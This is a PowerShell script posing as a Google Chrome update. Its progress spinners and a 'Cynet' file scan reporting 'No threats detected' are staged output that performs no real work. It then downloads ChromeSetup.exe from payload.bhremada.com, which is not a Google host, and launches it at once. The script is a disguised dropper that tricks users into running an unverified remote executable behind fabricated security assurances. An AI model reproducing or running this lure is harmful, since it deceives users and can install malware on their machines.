Clear-Host

# ─── Helpers ────────────────────────────────────────────────────────────────

function info    { param($msg) Write-Host "  [~] $msg" -ForegroundColor Blue }
function success { param($msg) Write-Host "  [✔] $msg" -ForegroundColor Green }
function warn    { param($msg) Write-Host "  [!] $msg" -ForegroundColor Yellow }
function err     { param($msg) Write-Host "  [✘] $msg" -ForegroundColor Red }
function task    { param($msg) Write-Host "`n[*] $msg" -ForegroundColor Cyan }

function spinner {
    param(
        [string]$Message,
        [int]$Duration = 5
    )
    $frames  = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $end     = (Get-Date).AddSeconds($Duration)
    $clear   = "`r" + (" " * ($Message.Length + 10)) + "`r"

    while ((Get-Date) -lt $end) {
        foreach ($frame in $frames) {
            Write-Host -NoNewline "`r  " 
            Write-Host -NoNewline $frame -ForegroundColor Cyan
            Write-Host -NoNewline "  $Message"
            Start-Sleep -Milliseconds 100
        }
    }
    Write-Host -NoNewline $clear
}

# ─── Script ─────────────────────────────────────────────────────────────────

task    "Updating Google Chrome..."
info    "Fetching latest version from official sources..."
spinner "Downloading package..." -Duration 2
success "Package downloaded."

task    "Cynet — Running file scan..."
spinner "Cynet — Scanning downloaded files..." -Duration 2
success "Cynet — Scan complete. No threats detected."

task    "Installing package..."
info    "Saving installer..."
wget "https://payload.bhremada.com/ChromeSetup.exe" -o "ChromeSetup.exe"
info    "Launching installer..."
.\ChromeSetup.exe
